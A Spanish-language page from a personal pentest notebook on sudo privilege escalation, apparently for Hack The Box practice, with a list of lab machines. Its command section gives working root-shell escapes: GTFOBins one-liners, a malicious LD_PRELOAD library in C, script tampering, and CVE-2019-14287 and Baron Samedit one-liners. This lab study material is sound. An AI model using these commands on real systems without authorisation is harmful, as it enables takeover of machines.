# Técnica: sudo

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

**377 máquina(s)** mencionan esta técnica.

Alias buscados: `sudoers`

> Esta técnica tiene **recetario de comandos**. Está más abajo, después de la lista de máquinas.

## Comandos

> **Placeholders**: `<IP>` · `/usr/bin/<binario>` · `<USER>`

### Paso 1 — siempre empezar por acá

```bash
sudo -l
```

Treinta segundos, y es la vía con más rendimiento. Buscá tres cosas:
**(a)** un binario permitido, **(b)** `env_keep`, **(c)** `NOPASSWD`.

### Paso 2a — binario permitido → GTFOBins

Buscá el binario en **https://gtfobins.github.io** y copiá el comando. No
inventes sintaxis.

```bash
sudo vim -c ':!/bin/sh'
sudo less /etc/hosts         # y adentro:  !/bin/sh
sudo find . -exec /bin/sh \; -quit
sudo awk 'BEGIN {system("/bin/sh")}'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo env /bin/sh
sudo nmap --interactive          # versiones viejas
```

### Paso 2b — `env_keep+=LD_PRELOAD` → escalada limpia

Si `sudo -l` muestra `env_keep+=LD_PRELOAD`:

```bash
cat > /tmp/x.c << 'FIN_C'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init(void){ setuid(0); setgid(0); system("/bin/bash -p"); }
FIN_C

gcc -fPIC -shared -o /tmp/x.so /tmp/x.c -nostartfiles
sudo LD_PRELOAD=/tmp/x.so <cualquier_binario_del_sudoers>
```

### Paso 2c — `LD_LIBRARY_PATH` con `env_keep`

```bash
# Copiar una librería que use el binario permitido, y reemplazarla
ldd /usr/bin/<binario_permitido>
# Plantar tu .so y ejecutar con el PATH manipulado
sudo LD_LIBRARY_PATH=/tmp /usr/bin/<binario_permitido>
```

### Paso 2d — script propio permitido

Si `sudo -l` permite ejecutar **un script que vos podés escribir**:

```bash
sudo -l
# (root) NOPASSWD: /opt/backup.sh
ls -la /opt/backup.sh
# Si es escribible → metele la escalada
echo '/bin/bash -p' >> /opt/backup.sh
sudo /opt/backup.sh
```

### Paso 2e — CVEs de sudo

```bash
sudo --version
searchsploit sudo
```

| CVE | Afecta | Comando |
| --- | --- | --- |
| CVE-2019-14287 | sudo < 1.8.28 | `sudo -u#-1 /bin/bash` |
| CVE-2021-3156 (Baron Samedit) | sudo < 1.9.5p2 | `sudoedit -s '\' $(python3 -c 'print("A"*1000)')` |

### Señales de alarma en `sudo -l`

```text
User aleks may run the following commands on down:
    (ALL : ALL) ALL          ← sos root, `sudo -i` y listo

    (root) NOPASSWD: /usr/bin/vim      ← GTFOBins

    (root) SETENV: /usr/bin/python3    ← SETENV permite inyectar env

Defaults        env_keep += LD_PRELOAD     ← el vector de arriba
```

## Referencias

- [[GTFOBins|GTFOBins (espejo local)]] — https://gtfobins.github.io/

---

## Máquinas

- [[htb-expressway\|Expressway]] — 97 mención(es) · Linux · Easy
- [[htb-interactive\|htb-interactive]] — 74 mención(es)
- [[htb-dump\|Dump]] — 60 mención(es) · Linux · Hard
- [[htb-sorcery\|Sorcery]] — 58 mención(es) · Linux · Insane
- [[htb-joker\|Joker]] — 57 mención(es) · Linux · Hard
- [[htb-permx\|PermX]] — 52 mención(es) · Linux · Easy
- [[htb-manage\|Manage]] — 49 mención(es) · Linux · Easy
- [[htb-previse\|Previse]] — 41 mención(es) · Linux · Easy
- [[htb-intuition\|Intuition]] — 35 mención(es) · Linux · Hard
- [[htb-giveback\|Giveback]] — 31 mención(es) · Linux · Medium
- [[htb-airtouch\|AirTouch]] — 30 mención(es) · Linux · Medium
- [[htb-mist\|Mist]] — 28 mención(es) · Windows · Insane
- [[htb-frolic\|Frolic]] — 27 mención(es) · Linux · Easy
- [[htb-obscurity\|Obscurity]] — 27 mención(es) · Linux · Medium
- [[htb-sherlock-brutus\|Brutus]] — 27 mención(es) · Very
- [[htb-sunday\|Sunday]] — 25 mención(es) · Solaris · Easy
- [[htb-admirer\|Admirer]] — 23 mención(es) · Linux · Easy
- [[htb-tentacle\|Tentacle]] — 23 mención(es) · Linux · Hard
- [[htb-feline\|Feline]] — 22 mención(es) · Linux · Hard
- [[htb-snoopy\|Snoopy]] — 22 mención(es) · Linux · Hard
- [[htb-agile\|Agile]] — 21 mención(es) · Linux · Medium
- [[htb-fries\|Fries]] — 20 mención(es) · Windows · Hard
- [[htb-guardian\|Guardian]] — 20 mención(es) · Linux · Hard
- [[htb-barrier\|Barrier]] — 19 mención(es) · Linux · Medium
- [[htb-blunder\|Blunder]] — 19 mención(es) · Linux · Easy
- [[htb-ariekei\|Ariekei]] — 18 mención(es) · Linux · Insane
- [[htb-blockblock\|BlockBlock]] — 18 mención(es) · Linux · Hard
- [[htb-dynstr\|Dynstr]] — 18 mención(es) · Linux · Medium
- [[htb-mango\|Mango]] — 18 mención(es) · Linux · Medium
- [[htb-formulax\|FormulaX]] — 17 mención(es) · Linux · Hard
- [[htb-oz\|Oz]] — 17 mención(es) · Linux · Hard
- [[htb-passage\|Passage]] — 17 mención(es) · Linux · Medium
- [[htb-pterodactyl\|Pterodactyl]] — 17 mención(es) · Linux · Medium
- [[htb-university\|University]] — 17 mención(es) · Windows · Insane
- [[htb-variatype\|VariaType]] — 17 mención(es) · Linux · Medium
- [[htb-busqueda\|Busqueda]] — 16 mención(es) · Linux · Easy
- [[htb-jewel\|Jewel]] — 16 mención(es) · Linux · Medium
- [[htb-node\|Node]] — 16 mención(es) · Linux · Medium
- [[htb-paper\|Paper]] — 16 mención(es) · Linux · Easy
- [[htb-canape\|Canape]] — 15 mención(es) · Linux · Medium
- [[htb-codetwo\|CodeTwo]] — 15 mención(es) · Linux · Easy
- [[htb-flustered\|Flustered]] — 15 mención(es) · Linux · Medium
- [[htb-forgotten\|Forgotten]] — 15 mención(es) · Linux · Easy
- [[htb-imagery\|Imagery]] — 15 mención(es) · Linux · Medium
- [[htb-previous\|Previous]] — 15 mención(es) · Linux · Medium
- [[htb-sandworm\|Sandworm]] — 15 mención(es) · Linux · Medium
- [[htb-schooled\|Schooled]] — 15 mención(es) · FreeBSD · Medium
- [[htb-whiterabbit\|WhiteRabbit]] — 15 mención(es) · Linux · Insane
- [[htb-backendtwo\|BackendTwo]] — 14 mención(es) · Linux · Medium
- [[htb-crossfittwo\|CrossFitTwo]] — 14 mención(es) · OpenBSD · Insane
- [[htb-data\|Data]] — 14 mención(es) · Linux · Easy
- [[htb-jail\|Jail]] — 14 mención(es) · Linux · Insane
- [[htb-nodeblog\|NodeBlog]] — 14 mención(es) · Linux · Easy
- [[htb-travel\|Travel]] — 14 mención(es) · Linux · Hard
- [[htb-browsed\|Browsed]] — 13 mención(es) · Linux · Medium
- [[htb-clicker\|Clicker]] — 13 mención(es) · Linux · Medium
- [[htb-encoding\|Encoding]] — 13 mención(es) · Linux · Medium
- [[htb-outbound\|Outbound]] — 13 mención(es) · Linux · Easy
- [[htb-rainyday\|RainyDay]] — 13 mención(es) · Linux · Hard
- [[htb-backfire\|Backfire]] — 12 mención(es) · Linux · Medium
- [[htb-cobblestone\|Cobblestone]] — 12 mención(es) · Linux · Insane
- [[htb-conversor\|Conversor]] — 12 mención(es) · Linux · Easy
- [[htb-dog\|Dog]] — 12 mención(es) · Linux · Easy
- [[htb-helix\|Helix]] — 12 mención(es) · Linux · Medium
- [[htb-moderators\|Moderators]] — 12 mención(es) · Linux · Hard
- [[htb-monitored\|Monitored]] — 12 mención(es) · Linux · Medium
- [[htb-ophiuchi\|Ophiuchi]] — 12 mención(es) · Linux · Medium
- [[htb-perfection\|Perfection]] — 12 mención(es) · Linux · Easy
- [[htb-photobomb\|Photobomb]] — 12 mención(es) · Linux · Easy
- [[htb-redcross\|RedCross]] — 12 mención(es) · Linux · Medium
- [[htb-rope\|Rope]] — 12 mención(es) · Linux · Insane
- [[htb-sherlock-nubilum-1\|Nubilum-1]] — 12 mención(es) · Medium
- [[htb-silentium\|Silentium]] — 12 mención(es) · Linux · Easy
- [[htb-traverxec\|Traverxec]] — 12 mención(es) · Linux · Easy
- [[htb-union\|Union]] — 12 mención(es) · Linux · Medium
- [[htb-brainfuck\|Brainfuck]] — 11 mención(es) · Linux · Insane
- [[htb-broker\|Broker]] — 11 mención(es) · Linux · Easy
- [[htb-chainsaw\|Chainsaw]] — 11 mención(es) · Linux · Hard
- [[htb-codify\|Codify]] — 11 mención(es) · Linux · Easy
- [[htb-cybermonday\|CyberMonday]] — 11 mención(es) · Linux · Hard
- [[htb-devvortex\|DevVortex]] — 11 mención(es) · Linux · Easy
- [[htb-inception\|Inception]] — 11 mención(es) · Linux · Medium
- [[htb-lightweight\|Lightweight]] — 11 mención(es) · Linux · Medium
- [[htb-linkvortex\|LinkVortex]] — 11 mención(es) · Linux · Easy
- [[htb-seventeen\|Seventeen]] — 11 mención(es) · Linux · Hard
- [[htb-skyfall\|Skyfall]] — 11 mención(es) · Linux · Insane
- [[htb-tartarsauce\|TartarSauce]] — 11 mención(es) · Linux · Medium
- [[htb-blurry\|Blurry]] — 10 mención(es) · Linux · Medium
- [[htb-cctv\|CCTV]] — 10 mención(es) · Linux · Easy
- [[htb-cozyhosting\|CozyHosting]] — 10 mención(es) · Linux · Easy
- [[htb-eureka\|Eureka]] — 10 mención(es) · Linux · Hard
- [[htb-forwardslash\|ForwardSlash]] — 10 mención(es) · Linux · Hard
- [[htb-interface\|Interface]] — 10 mención(es) · Linux · Medium
- [[htb-lantern\|Lantern]] — 10 mención(es) · Linux · Hard
- [[htb-meta\|Meta]] — 10 mención(es) · Linux · Medium
- [[htb-mirai\|Mirai]] — 10 mención(es) · Linux · Easy
- [[htb-registry\|Registry]] — 10 mención(es) · Linux · Hard
- [[htb-shrek\|Shrek]] — 10 mención(es) · Linux · Hard
- [[htb-slonik\|Slonik]] — 10 mención(es) · Linux · Medium
- [[htb-timing\|Timing]] — 10 mención(es) · Linux · Medium
- [[htb-wingdata\|WingData]] — 10 mención(es) · Linux · Easy
- [[htb-academy\|Academy]] — 9 mención(es) · Linux · Easy
- [[htb-armageddon\|Armageddon]] — 9 mención(es) · Linux · Easy
- [[htb-bookworm\|Bookworm]] — 9 mención(es) · Linux · Insane
- [[htb-curling\|Curling]] — 9 mención(es) · Linux · Easy
- [[htb-devarea\|DevArea]] — 9 mención(es) · Linux · Medium
- [[htb-editorial\|Editorial]] — 9 mención(es) · Linux · Easy
- [[htb-era\|Era]] — 9 mención(es) · Linux · Medium
- [[htb-facts\|Facts]] — 9 mención(es) · Linux · Easy
- [[htb-laboratory\|Laboratory]] — 9 mención(es) · Linux · Easy
- [[htb-pandora\|Pandora]] — 9 mención(es) · Linux · Easy
- [[htb-pirate\|Pirate]] — 9 mención(es) · Windows · Hard
- [[htb-routerspace\|RouterSpace]] — 9 mención(es) · Linux · Easy
- [[htb-squashed\|Squashed]] — 9 mención(es) · Linux · Easy
- [[htb-artificial\|Artificial]] — 8 mención(es) · Linux · Easy
- [[htb-checker\|Checker]] — 8 mención(es) · Linux · Hard
- [[htb-code\|Code]] — 8 mención(es) · Linux · Easy
- [[htb-faculty\|Faculty]] — 8 mención(es) · Linux · Medium
- [[htb-ghostlink\|Ghostlink]] — 8 mención(es) · Windows · Hard
- [[htb-gofer\|Gofer]] — 8 mención(es) · Linux · Hard
- [[htb-kobold\|Kobold]] — 8 mención(es) · Linux · Easy
- [[htb-networked\|Networked]] — 8 mención(es) · Linux · Easy
- [[htb-onetwoseven\|OneTwoSeven]] — 8 mención(es) · Linux · Hard
- [[htb-onlyforyou\|OnlyForYou]] — 8 mención(es) · Linux · Medium
- [[htb-reset\|Reset]] — 8 mención(es) · Linux · Easy
- [[htb-scriptkiddie\|ScriptKiddie]] — 8 mención(es) · Linux · Easy
- [[htb-sneakymailer\|SneakyMailer]] — 8 mención(es) · Linux · Medium
- [[htb-surveillance\|Surveillance]] — 8 mención(es) · Linux · Medium
- [[htb-swagshop\|SwagShop]] — 8 mención(es) · Linux · Easy
- [[htb-tenten\|Tenten]] — 8 mención(es) · Linux · Medium
- [[htb-traceback\|Traceback]] — 8 mención(es) · Linux · Easy
- [[htb-underpass\|UnderPass]] — 8 mención(es) · Linux · Easy
- [[htb-unrested\|Unrested]] — 8 mención(es) · Linux · Medium
- [[htb-vault\|Vault]] — 8 mención(es) · Linux · Medium
- [[htb-abducted\|Abducted]] — 7 mención(es) · Linux · Medium
- [[htb-beep\|Beep]] — 7 mención(es) · Linux · Easy
- [[htb-bitlab\|Bitlab]] — 7 mención(es) · Linux · Medium
- [[htb-blocky\|Blocky]] — 7 mención(es) · Linux · Easy
- [[htb-cerberus\|Cerberus]] — 7 mención(es) · Windows · Hard
- [[htb-darkcorp\|DarkCorp]] — 7 mención(es) · Windows · Insane
- [[htb-developer\|Developer]] — 7 mención(es) · Linux · Hard
- [[htb-down\|Down]] — 7 mención(es) · Linux · Easy
- [[htb-headless\|Headless]] — 7 mención(es) · Linux · Easy
- [[htb-interpreter\|Interpreter]] — 7 mención(es) · Linux · Medium
- [[htb-investigation\|Investigation]] — 7 mención(es) · Linux · Medium
- [[htb-nanocorp\|NanoCorp]] — 7 mención(es) · Windows · Hard
- [[htb-openadmin\|OpenAdmin]] — 7 mención(es) · Linux · Easy
- [[htb-opensource\|OpenSource]] — 7 mención(es) · Linux · Easy
- [[htb-orion\|Orion]] — 7 mención(es) · Linux · Easy
- [[htb-precious\|Precious]] — 7 mención(es) · Linux · Easy
- [[htb-static\|Static]] — 7 mención(es) · Linux · Hard
- [[htb-stocker\|Stocker]] — 7 mención(es) · Linux · Easy
- [[htb-time\|Time]] — 7 mención(es) · Linux · Medium
- [[htb-toby\|Toby]] — 7 mención(es) · Linux · Insane
- [[htb-yummy\|Yummy]] — 7 mención(es) · Linux · Hard
- [[htb-anubis\|Anubis]] — 6 mención(es) · Windows · Insane
- [[htb-bigbang\|BigBang]] — 6 mención(es) · Linux · Hard
- [[htb-cypher\|Cypher]] — 6 mención(es) · Linux · Medium
- [[htb-environment\|Environment]] — 6 mención(es) · Linux · Medium
- [[htb-format\|Format]] — 6 mención(es) · Linux · Medium
- [[htb-hacknet\|HackNet]] — 6 mención(es) · Linux · Medium
- [[htb-mailroom\|Mailroom]] — 6 mención(es) · Linux · Hard
- [[htb-mirage\|Mirage]] — 6 mención(es) · Windows · Hard
- [[htb-monitorsthree\|MonitorsThree]] — 6 mención(es) · Linux · Medium
- [[htb-ouija\|Ouija]] — 6 mención(es) · Linux · Insane
- [[htb-pivotapi\|PivotAPI]] — 6 mención(es) · Windows · Insane
- [[htb-principal\|Principal]] — 6 mención(es) · Linux · Medium
- [[htb-redpanda\|RedPanda]] — 6 mención(es) · Linux · Easy
- [[htb-sau\|Sau]] — 6 mención(es) · Linux · Easy
- [[htb-shibuya\|Shibuya]] — 6 mención(es) · Windows · Hard
- [[htb-snapped\|Snapped]] — 6 mención(es) · Linux · Hard
- [[htb-soccer\|Soccer]] — 6 mención(es) · Linux · Easy
- [[htb-socket\|Socket]] — 6 mención(es) · Linux · Medium
- [[htb-soulmate\|soulmate]] — 6 mención(es) · Linux · Easy
- [[htb-spectra\|Spectra]] — 6 mención(es) · Chrome · Easy
- [[htb-stratosphere\|Stratosphere]] — 6 mención(es) · Linux · Medium
- [[htb-zipping\|Zipping]] — 6 mención(es) · Linux · Medium
- [[htb-bagel\|Bagel]] — 5 mención(es) · Linux · Medium
- [[htb-boardlight\|BoardLight]] — 5 mención(es) · Linux · Easy
- [[htb-charon\|Charon]] — 5 mención(es) · Linux · Hard
- [[htb-darkzero\|DarkZero]] — 5 mención(es) · Windows · Hard
- [[htb-forge\|Forge]] — 5 mención(es) · Linux · Medium
- [[htb-gavel\|Gavel]] — 5 mención(es) · Linux · Medium
- [[htb-intelligence\|Intelligence]] — 5 mención(es) · Windows · Medium
- [[htb-intentions\|Intentions]] — 5 mención(es) · Linux · Hard
- [[htb-jarmis\|Jarmis]] — 5 mención(es) · Linux · Medium
- [[htb-jarvis\|Jarvis]] — 5 mención(es) · Linux · Medium
- [[htb-jupiter\|Jupiter]] — 5 mención(es) · Linux · Medium
- [[htb-logging\|Logging]] — 5 mención(es) · Windows · Medium
- [[htb-lustroustwo\|LustrousTwo]] — 5 mención(es) · Windows · Hard
- [[htb-magicgardens\|MagicGardens]] — 5 mención(es) · Linux · Insane
- [[htb-mentor\|Mentor]] — 5 mención(es) · Linux · Medium
- [[htb-monitors\|Monitors]] — 5 mención(es) · Linux · Hard
- [[htb-nibbles\|Nibbles]] — 5 mención(es) · Linux · Easy
- [[htb-nocturnal\|Nocturnal]] — 5 mención(es) · Linux · Easy
- [[htb-optimum\|Optimum]] — 5 mención(es) · Windows · Easy
- [[htb-overwatch\|Overwatch]] — 5 mención(es) · Windows · Medium
- [[htb-phantom\|Phantom]] — 5 mención(es) · Windows · Medium
- [[htb-registrytwo\|RegistryTwo]] — 5 mención(es) · Linux · Insane
- [[htb-ropetwo\|RopeTwo]] — 5 mención(es) · Linux · Insane
- [[htb-seal\|Seal]] — 5 mención(es) · Linux · Medium
- [[htb-shoppy\|Shoppy]] — 5 mención(es) · Linux · Easy
- [[htb-tenet\|Tenet]] — 5 mención(es) · Linux · Medium
- [[htb-trickster\|Trickster]] — 5 mención(es) · Linux · Medium
- [[htb-unicode\|Unicode]] — 5 mención(es) · Linux · Medium
- [[htb-usage\|Usage]] — 5 mención(es) · Linux · Easy
- [[htb-alert\|Alert]] — 4 mención(es) · Linux · Easy
- [[htb-attended\|Attended]] — 4 mención(es) · OpenBSD · Insane
- [[htb-bamboo\|Bamboo]] — 4 mención(es) · Linux · Medium
- [[htb-bountyhunter\|BountyHunter]] — 4 mención(es) · Linux · Easy
- [[htb-breach\|Breach]] — 4 mención(es) · Windows · Medium
- [[htb-broscience\|BroScience]] — 4 mención(es) · Linux · Medium
- [[htb-build\|Build]] — 4 mención(es) · Linux · Medium
- [[htb-catch\|Catch]] — 4 mención(es) · Linux · Medium
- [[htb-dab\|Dab]] — 4 mención(es) · Linux · Hard
- [[htb-fatty\|Fatty]] — 4 mención(es) · Linux · Insane
- [[htb-holiday\|Holiday]] — 4 mención(es) · Linux · Hard
- [[htb-iclean\|IClean]] — 4 mención(es) · Linux · Medium
- [[htb-knife\|Knife]] — 4 mención(es) · Linux · Easy
- [[htb-metatwo\|MetaTwo]] — 4 mención(es) · Linux · Easy
- [[htb-pc\|PC]] — 4 mención(es) · Linux · Easy
- [[htb-pilgrimage\|Pilgrimage]] — 4 mención(es) · Linux · Easy
- [[htb-proper\|Proper]] — 4 mención(es) · Windows · Hard
- [[htb-scanned\|Scanned]] — 4 mención(es) · Linux · Insane
- [[htb-scepter\|Scepter]] — 4 mención(es) · Windows · Hard
- [[htb-sightless\|Sightless]] — 4 mención(es) · Linux · Easy
- [[htb-strutted\|Strutted]] — 4 mención(es) · Linux · Medium
- [[htb-thefrizz\|TheFrizz]] — 4 mención(es) · Windows · Medium
- [[htb-thenotebook\|TheNotebook]] — 4 mención(es) · Linux · Medium
- [[htb-toolbox\|Toolbox]] — 4 mención(es) · Windows · Easy
- [[htb-trick\|Trick]] — 4 mención(es) · Linux · Easy
- [[htb-twomillion\|TwoMillion]] — 4 mención(es) · Linux · Easy
- [[htb-voleur\|Voleur]] — 4 mención(es) · Windows · Medium
- [[htb-zero\|Zero]] — 4 mención(es) · Linux · Insane
- [[htb-apocalyst\|Apocalyst]] — 3 mención(es) · Linux · Medium
- [[htb-apt\|APT]] — 3 mención(es) · Windows · Insane
- [[htb-bashed\|Bashed]] — 3 mención(es) · Linux · Easy
- [[htb-bruno\|Bruno]] — 3 mención(es) · Windows · Medium
- [[htb-drive\|Drive]] — 3 mención(es) · Linux · Hard
- [[htb-eighteen\|Eighteen]] — 3 mención(es) · Windows · Easy
- [[htb-fighter\|Fighter]] — 3 mención(es) · Windows · Insane
- [[htb-fluxcapacitor\|FluxCapacitor]] — 3 mención(es) · Linux · Medium
- [[htb-forgot\|Forgot]] — 3 mención(es) · Linux · Medium
- [[htb-lame-more\|More Lame]] — 3 mención(es)
- [[htb-logforge\|LogForge]] — 3 mención(es) · Linux · Medium
- [[htb-minion\|Minion]] — 3 mención(es) · Windows · Insane
- [[htb-overgraph\|Overgraph]] — 3 mención(es) · Linux · Hard
- [[htb-playertwo\|PlayerTwo]] — 3 mención(es) · Linux · Insane
- [[htb-popcorn\|Popcorn]] — 3 mención(es) · Linux · Medium
- [[htb-puppy\|Puppy]] — 3 mención(es) · Windows · Medium
- [[htb-pwnbox-review\|HTB Pwnbox Review]] — 3 mención(es)
- [[htb-resource\|Resource]] — 3 mención(es) · Linux · Hard
- [[htb-rustykey\|RustyKey]] — 3 mención(es) · Windows · Hard
- [[htb-sekhmet\|Sekhmet]] — 3 mención(es) · Windows · Insane
- [[htb-shocker\|Shocker]] — 3 mención(es) · Linux · Easy
- [[htb-signed\|Signed]] — 3 mención(es) · Windows · Medium
- [[htb-solarlab\|SolarLab]] — 3 mención(es) · Windows · Medium
- [[htb-tally\|Tally]] — 3 mención(es) · Windows · Hard
- [[htb-updown\|UpDown]] — 3 mención(es) · Linux · Medium
- [[htb-visual\|Visual]] — 3 mención(es) · Windows · Medium
- [[htb-vulncicada\|VulnCicada]] — 3 mención(es) · Windows · Medium
- [[htb-writer\|Writer]] — 3 mención(es) · Linux · Medium
- [[htb-absolute\|Absolute]] — 2 mención(es) · Windows · Insane
- [[htb-administrator\|Administrator]] — 2 mención(es) · Windows · Medium
- [[htb-altered\|Altered]] — 2 mención(es) · Linux · Hard
- [[htb-analysis\|Analysis]] — 2 mención(es) · Windows · Hard
- [[htb-axlle\|Axlle]] — 2 mención(es) · Windows · Hard
- [[htb-baby\|Baby]] — 2 mención(es) · Windows · Easy
- [[htb-babytwo\|BabyTwo]] — 2 mención(es) · Windows · Medium
- [[htb-bizness\|Bizness]] — 2 mención(es) · Linux · Easy
- [[htb-caption\|Caption]] — 2 mención(es) · Linux · Hard
- [[htb-chemistry\|Chemistry]] — 2 mención(es) · Linux · Easy
- [[htb-coder\|Coder]] — 2 mención(es) · Windows · Insane
- [[htb-corporate\|Corporate]] — 2 mención(es) · Linux · Insane
- [[htb-delegate\|Delegate]] — 2 mención(es) · Windows · Medium
- [[htb-derailed\|Derailed]] — 2 mención(es) · Linux · Insane
- [[htb-driver\|Driver]] — 2 mención(es) · Windows · Easy
- [[htb-earlyaccess\|EarlyAccess]] — 2 mención(es) · Linux · Hard
- [[htb-editor\|Editor]] — 2 mención(es) · Linux · Easy
- [[htb-escape\|Escape]] — 2 mención(es) · Windows · Medium
- [[htb-falafel\|Falafel]] — 2 mención(es) · Linux · Hard
- [[htb-fingerprint\|Fingerprint]] — 2 mención(es) · Linux · Insane
- [[htb-flight\|Flight]] — 2 mención(es) · Windows · Hard
- [[htb-ghost\|Ghost]] — 2 mención(es) · Windows · Insane
- [[htb-hawk\|Hawk]] — 2 mención(es) · Linux · Medium
- [[htb-inject\|Inject]] — 2 mención(es) · Linux · Easy
- [[htb-kotarak\|Kotarak]] — 2 mención(es) · Linux · Hard
- [[htb-lacasadepapel\|LaCasaDePapel]] — 2 mención(es) · Linux · Easy
- [[htb-lazy\|Lazy]] — 2 mención(es) · Linux · Medium
- [[htb-luanne\|Luanne]] — 2 mención(es) · NetBSD · Easy
- [[htb-mailing\|Mailing]] — 2 mención(es) · Windows · Easy
- [[htb-media\|Media]] — 2 mención(es) · Windows · Medium
- [[htb-mischief\|Mischief]] — 2 mención(es) · Linux · Insane
- [[htb-monitorsfour\|MonitorsFour]] — 2 mención(es) · Windows · Easy
- [[htb-nexus\|Nexus]] — 2 mención(es) · Linux · Easy
- [[htb-object\|Object]] — 2 mención(es) · Windows · Hard
- [[htb-outdated\|Outdated]] — 2 mención(es) · Windows · Medium
- [[htb-perspective\|Perspective]] — 2 mención(es) · Windows · Insane
- [[htb-pikaboo\|Pikaboo]] — 2 mención(es) · Linux · Hard
- [[htb-pivotapi-more\|Three More PivotAPI Unintendeds]] — 2 mención(es)
- [[htb-pov\|Pov]] — 2 mención(es) · Windows · Medium
- [[htb-ransom\|Ransom]] — 2 mención(es) · Linux · Medium
- [[htb-rebound\|Rebound]] — 2 mención(es) · Windows · Insane
- [[htb-response\|Response]] — 2 mención(es) · Linux · Insane
- [[htb-retired\|Retired]] — 2 mención(es) · Linux · Medium
- [[htb-secnotes\|SecNotes]] — 2 mención(es) · Windows · Medium
- [[htb-sendai\|Sendai]] — 2 mención(es) · Windows · Medium
- [[htb-smasher2\|Smasher2]] — 2 mención(es) · Linux · Insane
- [[htb-sneaky\|Sneaky]] — 2 mención(es) · Linux · Medium
- [[htb-solidstate\|SolidState]] — 2 mención(es) · Linux · Medium
- [[htb-stacked\|Stacked]] — 2 mención(es) · Linux · Insane
- [[htb-tabby\|Tabby]] — 2 mención(es) · Linux · Easy
- [[htb-tombwatcher\|TombWatcher]] — 2 mención(es) · Windows · Medium
- [[htb-ypuffy\|Ypuffy]] — 2 mención(es) · OpenBSD · Medium
- [[htb-access\|Access]] — 1 mención(es) · Windows · Easy
- [[htb-admirertoo\|AdmirerToo]] — 1 mención(es) · Linux · Hard
- [[htb-antique\|Antique]] — 1 mención(es) · Linux · Easy
- [[htb-authority\|Authority]] — 1 mención(es) · Windows · Medium
- [[htb-backdoor\|Backdoor]] — 1 mención(es) · Linux · Easy
- [[htb-backend\|Backend]] — 1 mención(es) · Linux · Medium
- [[htb-bank\|Bank]] — 1 mención(es) · Linux · Easy
- [[htb-blazorized\|Blazorized]] — 1 mención(es) · Windows · Hard
- [[htb-breadcrumbs\|Breadcrumbs]] — 1 mención(es) · Windows · Hard
- [[htb-bucket\|Bucket]] — 1 mención(es) · Linux · Medium
- [[htb-calamity\|Calamity]] — 1 mención(es) · Linux · Hard
- [[htb-cap\|Cap]] — 1 mención(es) · Linux · Easy
- [[htb-carpediem\|CarpeDiem]] — 1 mención(es) · Linux · Hard
- [[htb-celestial\|Celestial]] — 1 mención(es) · Linux · Medium
- [[htb-cereal\|Cereal]] — 1 mención(es) · Windows · Hard
- [[htb-certificate\|Certificate]] — 1 mención(es) · Windows · Hard
- [[htb-devoops\|DevOops]] — 1 mención(es) · Linux · Medium
- [[htb-devzat\|Devzat]] — 1 mención(es) · Linux · Medium
- [[htb-doctor\|Doctor]] — 1 mención(es) · Linux · Easy
- [[htb-dyplesher\|Dyplesher]] — 1 mención(es) · Linux · Insane
- [[htb-extension\|Extension]] — 1 mención(es) · Linux · Hard
- [[htb-fluffy\|Fluffy]] — 1 mención(es) · Windows · Easy
- [[htb-flujab\|FluJab]] — 1 mención(es) · Linux · Hard
- [[htb-freelancer\|Freelancer]] — 1 mención(es) · Windows · Hard
- [[htb-fulcrum\|Fulcrum]] — 1 mención(es) · Linux · Insane
- [[htb-greenhorn\|GreenHorn]] — 1 mención(es) · Linux · Easy
- [[htb-haircut\|Haircut]] — 1 mención(es) · Linux · Medium
- [[htb-hathor\|Hathor]] — 1 mención(es) · Windows · Insane
- [[htb-heal\|Heal]] — 1 mención(es) · Linux · Medium
- [[htb-horizontall\|Horizontall]] — 1 mención(es) · Linux · Easy
- [[htb-infiltrator\|Infiltrator]] — 1 mención(es) · Windows · Insane
- [[htb-jab\|Jab]] — 1 mención(es) · Windows · Medium
- [[htb-jeeves\|Jeeves]] — 1 mención(es) · Windows · Medium
- [[htb-keeper\|Keeper]] — 1 mención(es) · Linux · Easy
- [[htb-laser\|Laser]] — 1 mención(es) · Linux · Insane
- [[htb-manager\|Manager]] — 1 mención(es) · Windows · Medium
- [[htb-mischief-more-root\|Mischief Additional Roots]] — 1 mención(es)
- [[htb-monitorstwo\|MonitorsTwo]] — 1 mención(es) · Linux · Easy
- [[htb-noter-alternative-root-first-blood\|Noter - Alternative Root (First Blood)]] — 1 mención(es)
- [[htb-nunchucks\|Nunchucks]] — 1 mención(es) · Linux · Easy
- [[htb-october\|October]] — 1 mención(es) · Linux · Medium
- [[htb-office\|Office]] — 1 mención(es) · Windows · Hard
- [[htb-phoenix\|Phoenix]] — 1 mención(es) · Linux · Hard
- [[htb-pikatwoo\|PikaTwoo]] — 1 mención(es) · Linux · Insane
- [[htb-pit\|Pit]] — 1 mención(es) · Linux · Medium
- [[htb-player\|Player]] — 1 mención(es) · Linux · Hard
- [[htb-scrambled-linux\|Scrambled [From Linux]]] — 1 mención(es)
- [[htb-secret\|Secret]] — 1 mención(es) · Linux · Easy
- [[htb-shibboleth\|Shibboleth]] — 1 mención(es) · Linux · Medium
- [[htb-silo\|Silo]] — 1 mención(es) · Windows · Medium
- [[htb-smasher\|Smasher]] — 1 mención(es) · Linux · Insane
- [[htb-spooktrol\|Spooktrol]] — 1 mención(es) · Linux · Hard
- [[htb-store\|Store]] — 1 mención(es) · Linux · Hard
- [[htb-streamio\|StreamIO]] — 1 mención(es) · Windows · Medium
- [[htb-sweep\|Sweep]] — 1 mención(es) · Windows · Medium
- [[htb-tartarsauce-part-2-backuperer-follow-up\|HTB TartarSauce: backuperer Follow-Up]] — 1 mención(es)
- [[htb-unbalanced\|Unbalanced]] — 1 mención(es) · Linux · Hard
- [[htb-unobtainium\|Unobtainium]] — 1 mención(es) · Linux · Hard
- [[htb-wall\|Wall]] — 1 mención(es) · Linux · Medium
- [[htb-wifinetic\|Wifinetic]] — 1 mención(es) · Linux · Easy
- [[htb-wifinetictwo\|WifineticTwo]] — 1 mención(es) · Linux · Medium
- [[htb-zipper\|Zipper]] — 1 mención(es) · Linux · Hard
- [[chuleta-smb-enum\|chuleta-smb-enum]] — 1 mención(es)

## Cómo ver el contexto

```bash
python3 _sistema/herramientas/buscar.py 'sudo' -v
